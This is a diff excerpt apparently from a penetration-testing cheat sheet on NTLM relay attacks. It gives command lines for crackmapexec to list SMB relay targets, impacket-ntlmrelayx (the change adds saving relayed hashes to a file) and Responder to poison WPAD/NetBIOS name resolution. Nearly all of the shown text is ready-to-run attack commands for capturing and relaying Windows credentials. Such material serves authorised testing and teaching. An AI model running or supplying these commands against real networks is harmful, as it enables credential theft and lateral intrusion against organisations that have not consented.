@@ -62,15 +62,15 @@ cat *.gnmap | grep -i "open/tcp" | cut -d " " -f2 | sort -u > perim_up_smb.txt
 crackmapexec smb perim_up_smb.txt --gen-relay-list relaylistOutputFilename.txt
 
 # 3. After we can run ntlmrelayx
-impacket-ntlmrelayx -tf relaylistOutputFilename.txt -smb2support
+impacket-ntlmrelayx -tf relaylistOutputFilename.txt -smb2support --output-file relayed-hash.txt
 
 # 4. Finally, using another shell, we can run Responder
 ## Light
 ./Responder.py -I eth0 
 ## Medium (enable wpad, netbios domain and wredir suffix queries)
-./Responder.py -I eth0 -rdw
+./Responder.py -I eth0 -dw
 ## Full (Force WPAD and ProxyAuth)
-./Responder.py -I eth0 -rdwFP
+./Responder.py -I eth0 -dwFP
 ```
 
 > If limited to a Windows system, you can use Inveigh instead of Responder : 
